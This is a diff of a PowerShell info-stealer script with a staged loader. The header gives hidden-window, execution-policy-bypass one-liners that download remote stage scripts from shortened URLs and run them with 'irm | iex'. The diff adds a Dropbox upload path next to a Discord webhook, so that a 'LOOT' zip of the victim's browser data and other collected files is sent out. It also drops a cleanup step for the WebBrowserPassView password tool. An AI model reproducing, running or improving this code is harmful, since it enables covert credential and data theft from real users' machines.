@@ -1,11 +1,33 @@
 <# 
 
-Execute command having a max caracters to put into, I need to shorten the links for the command to be as short as possible.
-Stage2 url : 
-                    https://shorturl.at/fiZ38
+______________________________________________________________________________________________
 
-Invoke powershell + stage 2 into it + be furtive : 
-powershell -w h -NoP -Ep Bypass -Command "& {Set-Variable -Name DiscordUrl -Value 'DISCORD_WEBHOOK'; irm https://shorturl.at/fiZ38 | iex}"
+888      d888                             888          d8888                            d8888  
+888     d8888                             888         d8P888                           d8P888  
+888       888                             888        d8P 888                          d8P 888  
+88888b.   888   .d88b.           88888b.  88888b.   d8P  888  888d888 88888b.d88b.   d8P  888  
+888 "88b  888  d88P"88b          888 "88b 888 "88b d88   888  888P"   888 "888 "88b d88   888  
+888  888  888  888  888          888  888 888  888 8888888888 888     888  888  888 8888888888 
+888 d88P  888  Y88b 888          888 d88P 888  888       888  888     888  888  888       888  
+88888P" 8888888 "Y88888 88888888 88888P"  888  888       888  888     888  888  888       888  
+                    888          888                                                           
+               Y8b d88P          888                                                           
+                "Y88P"           888                                                           
+______________________________________________________________________________________________
+
+
+Execute command having a max caracters to put into, I need to shorten the links for the command to be as short as possible.
+W1ns1d3r_st4gg2d --> stage1 url : https://shorturl.at/evBKX
+W1ns1d3r_st4gg2d --> stage2 url : https://shorturl.at/rLQS5
+
+Need to modify the invoke command to fit your needs : 
+	-Put your discord webhook into $dc=''
+ 	-Put your dropbox webhook into $db=''
+
+Invoke stage1.ps1 via windows : 
+powershell -NoP -Ep Bypass $dc='';$db='';irm https://shorturl.at/evBKX | iex
+powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://shorturl.at/rLQS5 | iex
+
 
 #>
 
@@ -19,6 +41,26 @@ function TempDir {
 
     # Change the directory to C:\temp
     Set-Location -Path "C:\temp"
+}
+
+function Upload-Dropbox {
+
+[CmdletBinding()]
+param (
+	
+[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+[Alias("f")]
+[string]$SourceFilePath
+) 
+$outputFile = Split-Path $SourceFilePath -leaf
+$TargetFilePath="/$outputFile"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $db
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
 
@@ -39,39 +81,34 @@ function Upload-Discord {
     }
 
     if (-not ([string]::IsNullOrEmpty($text))){
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)
     }
 
     if (-not ([string]::IsNullOrEmpty($file))){
-        curl.exe -F "file1=@$file" $DiscordUrl
+        curl.exe -F "file1=@$file" $dc
     }
 }
 
 
-# Function to create a zip archive using Compress-Archive and upload to Discord
-function ZipAndUploadToDiscord {
+# Specify the username
+$username = $env:username
+
+# Specify the date format for the archive name
+$dateSansHeure = Get-Date -Format "dd-MM-yyyy_HH'H'mm"
+
+# Specify the destination zip file path with username and date
+$zipFileName = "${username}_LOOT_${dateSansHeure}.zip"
+$zipFilePath = Join-Path -Path "C:\temp" -ChildPath $zipFileName
+
+# Function to create a zip archive using Compress-Archive
+function ZipFiles {
 
     # Specify the source directory
     $sourceDirectory = "C:\temp"
 
-    # Specify the username
-    $username = $env:username
-
-    # Specify the date format for the archive name
-    $dateSansHeure = Get-Date -Format "dd-MM-yyyy_HH'H'mm"
-
-    # Specify the destination zip file path with username and date
-    $zipFileName = "${username}_LOOT_${dateSansHeure}.zip"
-    $zipFilePath = Join-Path -Path "C:\temp" -ChildPath $zipFileName
-
     # Compress the contents of the source directory to a zip file
     Compress-Archive -Path $sourceDirectory -DestinationPath $zipFilePath
 
-    # Call Upload-Discord to send the zip archive to Discord
-    Upload-Discord -file $zipFilePath -text "Treasure :"
-
-    # Cleanup: Remove the zip file
-    Remove-Item -Path $zipFilePath -Force
 }
 
 
@@ -104,11 +141,15 @@ function Exfiltration {
     GrabBrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -Append -FilePath "Br0ws3r_d4t4.txt"
     GrabBrowserData -Browser "firefox" -DataType "history" | Out-File -Append -FilePath "Br0ws3r_d4t4.txt"
 
-    #Call RemoveNirsoft
-    RemoveNirsoft
+    #Call ZipFiles
+    ZipFiles
 
-    #Call ZipAndUploadToDiscord
-    ZipAndUploadToDiscord
+    # Call Upload-Discord
+    Upload-Discord -file $zipFilePath -text "Treasure :"
+
+    # Call Upload-Dropbox
+    Upload-Dropbox -SourceFilePath $zipFilePath
+    
 }
 
 function AntiSpywareInfo {
@@ -471,35 +512,6 @@ function DelTempDir {
         # Remove the C:\temp directory
         Remove-Item -Path "C:\temp" -Force -Recurse
     }
-
-function RemoveNirsoft {
-    $tempDirectory = "C:\temp"
-    
-    $filesToDelete = @(
-        "7z.zip",
-        "7z",
-        "readme.txt",
-        "wbpv.zip",
-        "WebBrowserPassView.cfg",
-        "WebBrowserPassView.chm",
-        "WebBrowserPassView.exe"
-    )
-
-    foreach ($file in $filesToDelete) {
-        $filePath = Join-Path -Path $tempDirectory -ChildPath $file
-
-        # Check if the file exists before attempting to remove it
-        if (Test-Path -Path $filePath -PathType Leaf) {
-            Remove-Item -Path $filePath -Force
-            Write-Host "Deleted file: $file"
-        } elseif (Test-Path -Path $filePath -PathType Container) {
-            Remove-Item -Path $filePath -Recurse -Force
-            Write-Host "Deleted directory: $file"
-        } else {
-            Write-Host "File not found: $file"
-        }
-    }
-}
 
 # Call TempDir
 TempDir
